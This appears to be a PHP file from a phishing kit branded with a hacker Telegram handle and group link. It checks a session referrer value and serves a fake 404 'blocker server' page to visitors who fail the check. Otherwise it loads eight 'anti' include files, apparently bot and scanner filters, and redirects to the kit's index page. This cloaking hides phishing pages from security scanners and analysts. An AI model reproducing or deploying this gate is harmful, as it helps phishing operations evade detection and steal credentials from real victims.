<?php
/*   
TELEGRAM @H4x0rxploit
JOIN US AT TELEGRAM GROUP : https://t.me/H4x0rxploits
*/
if  (isset($_SESSION['refData'])){
if ($_SESSION['refData'] != $_SESSION['redirectlink']) {
        header('HTTP/1.0 404 Not Found');
                die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
    }
}else{
                header('HTTP/1.0 404 Not Found');
                die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
    }
  	require 'anti1.php';
	require 'anti2.php';
	require 'anti3.php';
	require 'anti4.php';
	require 'anti5.php';
	require 'anti6.php';
	require 'anti7.php';
	require 'anti8.php';
	exit(header("Location: ../index.php"));
?>